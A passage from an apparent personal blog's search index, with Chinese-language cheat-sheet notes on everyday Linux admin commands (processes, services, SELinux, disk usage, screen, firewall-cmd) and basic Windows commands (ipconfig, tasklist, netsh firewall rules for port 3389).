杀死进程 kill -9 pid<br>w&amp;who  查看当前登录用户 W信息更详细一些。<br>启动服务项<br>systemctl stop/start/restart/status/enable/disable/ xxx<br>service network restart  重启网络服务： </p><h5 id="特殊操作"><a href="#特殊操作" class="headerlink" title="特殊操作"></a>特殊操作</h5><p>vim /etc/selinux/config  selinux 改成 disable关闭安全内核<br>setenforce 0    临时关闭</p><p>alias   设置自定义 命令   ls -l = ll</p><p>看指定目录占用大小<br>du -sh /<br>du -sh ./*<br>整个系统磁盘占用大小<br>df -h<br>后台运行并输出。<br>nohup &amp; </p><h5 id="窗口切换管理工具"><a href="#窗口切换管理工具" class="headerlink" title="窗口切换管理工具"></a>窗口切换管理工具</h5><p>screen -ls  查看窗口列表<br>screen -S name1  新建<br>screen -rd name1  切入<br>ctrl+A+D    切出</p><h5 id="命令行快捷键"><a href="#命令行快捷键" class="headerlink" title="命令行快捷键"></a>命令行快捷键</h5><p> Tab键：自动补齐<br> Ctrl+U：清空至行首<br> Ctrl+K：清空至行尾<br> Ctrl+L：清屏<br> Ctrl+C：中断命令执行<br> Ctrl+Z：后台挂起<br> Ctrl+D：退出Shell</p><h5 id="Linux-挂载U盘"><a href="#Linux-挂载U盘" class="headerlink" title="Linux 挂载U盘"></a>Linux 挂载U盘</h5><p>mount /dev<br>挂载到了mnt目录下。需要创建文件夹，执行 </p><h5 id="Python快速搭建http服务"><a href="#Python快速搭建http服务" class="headerlink" title="Python快速搭建http服务"></a>Python快速搭建http服务</h5><p> 自动共享运行目录<br> Python2 下<br> Python -m SimpleHTTPServer 8080<br> Python3下<br> Python3 -m http.server 8080</p><h5 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h5><p> /etc/service<br> 22改端口配置文件<br>/etc/ssh/sshd_config<br>firewall-cmd –state   //    检查防火墙是否开启<br>firewall-cmd –zone=public –list-ports   //列出当前防火墙的通过端口规则<br>firewall-cmd –zone=public –list-service  //列出当前防火墙的通过端口服务名称规则<br>firewall-cmd –zone=public –add-port=80/tcp –permanent   添加端口<br>firewall-cmd –zone=public –add-service=http –permanent  添加系统自定的/etc/service  服务名称<br>firewall-cmd –zone=public –remove-port=http –permanent  删除端口或服务<br>firewall-cmd –reload  //更改完后需要 重新加载配置文件，使其生效。</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows 基础命令</title>
      <link href="/posts/47555/"/>
      <url>/posts/47555/</url>
      
        <content type="html"><![CDATA[<h1 id="待完善"><a href="#待完善" class="headerlink" title="待完善"></a>待完善</h1><p>mstsc  远程桌面连接 </p><p>ipconfig  /all</p><p>ipconfig /release</p><p>ipconfig /renew</p><p>rename  </p><p>tasklist  查看进程</p><p>kill /pid id 杀进程</p><p>查看防火墙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofiles</span><br></pre></td></tr></table></figure><p>添加防火墙规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;&gt; netsh advfirewall firewall add rule name=icqtest dir=<span class="keyword">in</span>  action=allow protocol=tcp localport=3389</span><br></pre></td></tr></table></figure><p>删除防火墙规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;&gt; netsh advfirewall firewall delete rule name=icqtest protocol=tcp localport=3389</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> window </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
